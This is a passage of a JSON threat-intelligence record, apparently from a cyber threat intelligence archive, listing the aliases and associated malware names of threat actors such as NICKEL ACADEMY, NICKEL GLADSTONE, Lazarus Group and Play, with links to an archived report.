            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536259,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1653787398,
    "ts_modification_date": 1653787398,
    "files": {
        "pdf": "https://archive.orkl.eu/2a009d600f2806f32a0034171f6fec7e4d27a093.pdf",
        "text": "https://archive.orkl.eu/2a009d600f2806f32a0034171f6fec7e4d27a093.txt",
        "img": "https://archive.orkl.eu/2a009d600f2806f32a0034171f6fec7e4d27a093.jpg"
    }
}